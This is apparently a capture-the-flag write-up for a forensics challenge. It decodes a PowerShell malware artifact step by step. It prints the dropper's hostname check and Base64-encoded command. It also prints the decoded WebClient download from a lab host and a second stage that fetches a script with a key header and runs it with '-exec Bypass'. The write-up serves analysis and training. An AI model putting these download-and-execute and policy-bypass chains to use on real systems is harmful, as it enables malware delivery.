# Thorin’s Amulet


Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

By starting the challenge, we obtain a powershell script `artifact.ps1` :
```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```
First the script checks if it is running on `WORKSTATION-DM-0043` then if it is, it executes :
```powershell
"SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
``` 
Which gives us : 
```powershell
 ( New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```
Once decoded from Base64, it will download this from `http://korp.htb/update` :
```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```
This script will also GET a file at `http://korp.htb/a541a` with `5337d322906ff18afedc1edc191d325d` as the key and then execute it bypassing some powershell restrictions using `-exec Bypass`.

So we retrieve this file to see what's interesting inside, maybe malicious code, or maybe a flag ? Who knows.

![image-1](https://github.com/user-attachments/assets/3d72173f-3dcb-4a57-9247-5746e5528a2d)

![image-2](https://github.com/user-attachments/assets/bd53afe3-731d-4c8f-ac03-4ec33485ca0c)

So, we make it readable and a little surprise awaits us :

![image-3](https://github.com/user-attachments/assets/792052b8-7580-48a2-b91c-112da43214da)

ggs
